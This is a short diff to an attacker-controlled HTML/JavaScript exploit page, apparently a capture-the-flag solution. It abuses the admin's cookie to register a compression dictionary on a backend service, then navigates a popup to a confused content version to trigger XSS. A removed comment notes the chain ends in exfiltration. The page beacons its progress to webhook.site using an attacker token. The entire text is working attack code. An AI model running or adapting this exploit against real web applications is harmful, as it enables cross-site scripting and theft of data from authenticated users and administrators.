@@ -7,12 +7,13 @@
 const q = new URLSearchParams(location.search);
 const B = (q.get('b') || 'http://backend:8080').replace(/\/+$/,'');
 const P = '2';
-const WT = q.get('w') || '';                 // webhook token for progress beacons
+const WT = q.get('w') || '';
 function bx(s){ if(WT) new Image().src='https://webhook.site/'+WT+'/S?'+s+'&t='+Date.now(); }
 bx('step=loaded&B='+encodeURIComponent(B));
-// 1) register RB dictionary via top-level popup nav (SameSite=Lax => admin cookie sent)
-const w = window.open(B + '/api/content/' + P + '/1', 'x');
-// 2) after registration, navigate popup to the confused version -> dcz XSS -> exfil
+// 1) register the RB dictionary via the post page: its <link rel=preload href=/api/content/P/1>
+//    is a SAME-ORIGIN (first-party) subresource, so the admin cookie is always sent -> 200 -> dict stored.
+const w = window.open(B + '/post/' + P, 'x');
+// 2) once registered, navigate the popup (now on backend origin) to the confused version.
 setTimeout(function(){ bx('step=nav'); try { w.location = B + '/api/content/' + P + '/2'; } catch (e) {} }, 3000);
 </script>
 </body></html>
